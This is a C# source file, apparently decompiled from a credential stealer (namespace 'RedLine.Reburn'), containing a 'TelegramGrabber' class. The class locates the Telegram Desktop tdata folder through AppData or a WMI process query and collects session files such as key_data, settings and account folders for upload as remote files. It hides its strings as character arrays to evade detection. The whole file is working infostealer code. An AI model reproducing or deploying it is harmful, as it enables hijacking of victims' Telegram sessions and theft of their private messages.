using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class TelegramGrabber
{
	private static string GetTdata()
	{
		string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[23]
		{
			'\\', 'T', 'e', 'l', 'e', 'g', 'r', 'a', 'm', ' ',
			'D', 'e', 's', 'k', 't', 'o', 'p', '\\', 't', 'd',
			'a', 't', 'a'
		});
		Process[] processesByName = Process.GetProcessesByName(new string(new char[8] { 'T', 'e', 'l', 'e', 'g', 'r', 'a', 'm' }));
		if (processesByName.Length == 0)
		{
			return result;
		}
		return Path.Combine(new FileInfo(ProcessExecutablePath(processesByName[0])).Directory!.FullName, new string(new char[5] { 't', 'd', 'a', 't', 'a' }));
	}

	private static string ProcessExecutablePath(Process process)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		try
		{
			try
			{
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(new string(new char[51]
				{
					'S', 'E', 'L', 'E', 'C', 'T', ' ', 'E', 'x', 'e',
					'c', 'u', 't', 'a', 'b', 'l', 'e', 'P', 'a', 't',
					'h', ',', ' ', 'P', 'r', 'o', 'c', 'e', 's', 's',
					'I', 'D', ' ', 'F', 'R', 'O', 'M', ' ', 'W', 'i',
					'n', '3', '2', '_', 'P', 'r', 'o', 'c', 'e', 's',
					's'
				})).Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val = (ManagementObject)enumerator.get_Current();
						object obj = ((ManagementBaseObject)val).get_Item(new string(new char[9] { 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'D' }));
						object obj2 = ((ManagementBaseObject)val).get_Item(new string(new char[14]
						{
							'E', 'x', 'e', 'c', 'u', 't', 'a', 'b', 'l', 'e',
							'P', 'a', 't', 'h'
						}));
						if (obj2 != null && obj.ToString() == process.Id.ToString())
						{
							return obj2.ToString();
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
		return "";
	}

	public static List<RemoteFile> ParseFiles()
	{
		List<RemoteFile> list = new List<RemoteFile>();
		try
		{
			string tdata = GetTdata();
			string[] directories = Directory.GetDirectories(tdata);
			string[] files = Directory.GetFiles(tdata);
			foreach (string text in files)
			{
				FileInfo fileInfo = new FileInfo(text);
				string name = fileInfo.Name;
				if (fileInfo.Length <= 5120L)
				{
					if (name.Last() == 's' && name.Length < 18 && name.Length > 16)
					{
						list.Add(new RemoteFile(text));
					}
					else if (name.Contains(new string(new char[7] { 'u', 's', 'e', 'r', 't', 'a', 'g' })) || name.Contains(new string(new char[8] { 's', 'e', 't', 't', 'i', 'n', 'g', 's' })) || name.Contains(new string(new char[8] { 'k', 'e', 'y', '_', 'd', 'a', 't', 'a' })))
					{
						list.Add(new RemoteFile(text));
					}
				}
			}
			files = directories;
			for (int i = 0; i < files.Length; i++)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(files[i]);
				string name2 = directoryInfo.Name;
				if (name2.Length != 16)
				{
					continue;
				}
				foreach (FileInfo item in directoryInfo.EnumerateFiles())
				{
					list.Add(new RemoteFile(item.FullName)
					{
						FileDirectory = name2
					});
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
